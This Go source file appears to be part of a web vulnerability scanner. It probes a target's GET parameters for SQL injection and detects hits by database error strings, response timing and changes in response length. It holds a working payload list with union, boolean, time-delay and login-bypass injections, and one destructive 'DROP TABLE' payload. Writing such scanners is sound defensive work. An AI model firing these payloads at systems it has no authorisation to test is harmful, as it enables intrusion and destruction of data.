package tests

import (
	"fmt"
	"io"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/versaSecurityTest/internal/config"
)

// AdvancedSQLInjectionTest - Test agresivo y completo de SQL Injection
type AdvancedSQLInjectionTest struct {
	Discovery *DiscoveryResult
}

// Run ejecuta tests exhaustivos de SQL injection
func (t *AdvancedSQLInjectionTest) Run(targetURL string, client HTTPClient, payloads *config.PayloadConfig) TestResult {
	result := TestResult{
		TestName:    "Advanced SQL Injection Test",
		Status:      "Passed",
		Description: "No se detectaron vulnerabilidades de inyección SQL",
		Severity:    "None",
		Details:     []string{},
		Evidence:    []Evidence{},
	}

	// PAYLOADS EXHAUSTIVOS
	sqlPayloads := []string{
		// Básicos y Errores
		"'", "''", "\"", "\"\"", "`)", "'))",
		// Union Based
		"' UNION SELECT null,null,null--",
		"' UNION SELECT 1,2,3--",
		"\" UNION SELECT null,null,null--",
		// Boolean Based (Logic)
		"' AND 1=1--", "' AND 1=2--",
		"\" AND 1=1--", "\" AND 1=2--",
		"' OR '1'='1", "\" OR \"1\"=\"1",
		// Time Based
		"'; WAITFOR DELAY '00:00:05'--",               // MSSQL
		"'; SELECT pg_sleep(5)--",                     // PostgreSQL
		"' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", // MySQL
		"\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
		// DB Specific / Advanced
		"admin'--", "admin' #", "' OR 1=1#", "' OR 1=1/*",
		"'; DROP TABLE samples; --",
	}

	var endpointsToTest []string
	var paramsToTest []string

	if t.Discovery != nil && len(t.Discovery.Endpoints) > 0 {
		for _, info := range t.Discovery.Endpoints {
			for _, method := range info.Methods {
				if method == "GET" {
					endpointsToTest = append(endpointsToTest, info.Path)
					paramsToTest = append(paramsToTest, info.Params...)
				}
			}
		}
	} else {
		// Fallback si no hay descubrimiento
		endpointsToTest = []string{"/", "/login", "/search", "/api/user", "/products", "/category"}
		paramsToTest = []string{"id", "user", "q", "query", "cat", "search"}
	}

	var wg sync.WaitGroup
	var mu sync.Mutex
	var vulnerabilitiesFound int

	// Limitar concurrencia interna por test para no saturar totalmente
	semaphore := make(chan struct{}, 5)

	// Mapa para detectar inyecciones basadas en boolean
	// Guardamos la longitud de la página base para comparar
	baseResponses := make(map[string]int)

	for _, endpoint := range endpointsToTest {
		baseTestURL := targetURL + endpoint
		resp, err := client.Get(baseTestURL)
		if err == nil {
			body, _ := io.ReadAll(resp.Body)
			baseResponses[endpoint] = len(body)
			resp.Body.Close()
		}

		for _, param := range paramsToTest {
			for _, payload := range sqlPayloads {
				wg.Add(1)
				go func(e, p, pay string) {
					defer wg.Done()
					semaphore <- struct{}{}
					defer func() { <-semaphore }()

					testURL := fmt.Sprintf("%s%s?%s=%s", targetURL, e, p, url.QueryEscape(pay))

					startTime := time.Now()
					resp, err := client.Get(testURL)
					if err != nil {
						return
					}
					defer resp.Body.Close()

					duration := time.Since(startTime)
					bodyBytes, _ := io.ReadAll(resp.Body)
					body := string(bodyBytes)

					baseLen := baseResponses[e]
					vuln := t.analyzeEnhancedResponse(resp.StatusCode, body, duration, pay, baseLen)

					if vuln.IsVulnerable {
						mu.Lock()
						vulnerabilitiesFound++
						result.Evidence = append(result.Evidence, Evidence{
							Type:        "SQL Injection",
							URL:         testURL,
							Payload:     pay,
							StatusCode:  resp.StatusCode,
							Response:    vuln.Evidence,
							Description: vuln.Description,
							Severity:    vuln.Severity,
						})
						mu.Unlock()
					}
				}(endpoint, param, payload)
			}
		}
	}

	wg.Wait()

	if vulnerabilitiesFound > 0 {
		result.Status = "Failed"
		result.Severity = "Critical"
		result.Description = fmt.Sprintf("CRÍTICO: Se detectaron %d vulnerabilidades de SQL injection avanzadas", vulnerabilitiesFound)
	}

	return result
}

// SQLVulnerability estructura para análisis de vulnerabilidades
type SQLVulnerability struct {
	IsVulnerable bool
	Description  string
	Evidence     string
	Severity     string
}

// analyzeEnhancedResponse análisis mejorado con soporte para boolean-based
func (t *AdvancedSQLInjectionTest) analyzeEnhancedResponse(statusCode int, responseText string, responseTime time.Duration, payload string, baseLen int) SQLVulnerability {
	// Reutilizar lógica de errores existente
	vuln := t.analyzeResponse(statusCode, responseText, responseTime, payload)
	if vuln.IsVulnerable {
		return vuln
	}

	// Análisis Boolean-Based: detectar cambios significativos en el contenido
	if baseLen > 0 {
		currentLen := len(responseText)

		// Si el payload es un "true" lícito (como AND 1=1) y la respuesta es similar a la base
		// pero para un payload "false" (AND 1=2) la respuesta cambia drásticamente
		if strings.Contains(payload, "1=2") || strings.Contains(payload, "1=0") {
			diff := float64(baseLen-currentLen) / float64(baseLen)
			if diff > 0.3 || statusCode == 404 || statusCode == 403 {
				return SQLVulnerability{
					IsVulnerable: true,
					Description:  "Probable Boolean-based SQL injection (Blind)",
					Evidence:     fmt.Sprintf("Diferencia de contenido detectada para payload falso '%s' (Diff: %.2f%%)", payload, diff*100),
					Severity:     "High",
				}
			}
		}
	}

	return SQLVulnerability{IsVulnerable: false}
}

// analyzeResponse analiza la respuesta en busca de indicadores de SQL injection (Base)
func (t *AdvancedSQLInjectionTest) analyzeResponse(statusCode int, responseText string, responseTime time.Duration, payload string) SQLVulnerability {
	responseLower := strings.ToLower(responseText)

	// PATRONES DE ERROR SQL EXPANDIDOS
	sqlErrorPatterns := []struct {
		pattern  string
		database string
		severity string
	}{
		// MySQL / MariaDB
		{"you have an error in your sql syntax", "MariaDB/MySQL", "Critical"},
		{"warning: mysql_", "MySQL", "High"},
		{"valid mysql result", "MySQL", "High"},
		{"check the manual that corresponds to your mariadb server version", "MariaDB", "Critical"},

		// MSSQL
		{"microsoft ole db provider for sql server", "MSSQL", "Critical"},
		{"unclosed quotation mark after the character string", "MSSQL", "Critical"},
		{"incorrect syntax near", "MSSQL", "Critical"},
		{"sql server error", "MSSQL", "High"},

		// SQLite
		{"sqlite3::query", "SQLite", "High"},
		{"sqlite_error", "SQLite", "High"},
		{"sqlsyntaxerror: near", "SQLite", "Critical"},

		// PostgreSQL
		{"invalid input syntax for type", "PostgreSQL", "Critical"},
		{"unterminated quoted string", "PostgreSQL", "Critical"},
		{"postgresql query failed", "PostgreSQL", "High"},

		// Generic
		{"sql syntax", "Generic", "High"},
		{"database error", "Generic", "Medium"},
		{"internal server error", "Generic", "Low"}, // Solo si el payload disparó el error
	}

	// Buscar patrones de error
	for _, pattern := range sqlErrorPatterns {
		if strings.Contains(responseLower, pattern.pattern) {
			return SQLVulnerability{
				IsVulnerable: true,
				Description:  fmt.Sprintf("Inyección SQL detectable por error (%s)", pattern.database),
				Evidence:     fmt.Sprintf("Patrón '%s' con payload '%s'", pattern.pattern, payload),
				Severity:     pattern.severity,
			}
		}
	}

	// ANÁLISIS DE TIMING ATTACKS (5s threshold)
	if responseTime >= 4500*time.Millisecond && (strings.Contains(payload, "SLEEP") || strings.Contains(payload, "WAITFOR") || strings.Contains(payload, "pg_sleep")) {
		return SQLVulnerability{
			IsVulnerable: true,
			Description:  "Time-based Blind SQL injection",
			Evidence:     fmt.Sprintf("Respuesta tardía (%v) inducida por payload '%s'", responseTime, payload),
			Severity:     "Critical",
		}
	}

	return SQLVulnerability{IsVulnerable: false}
}
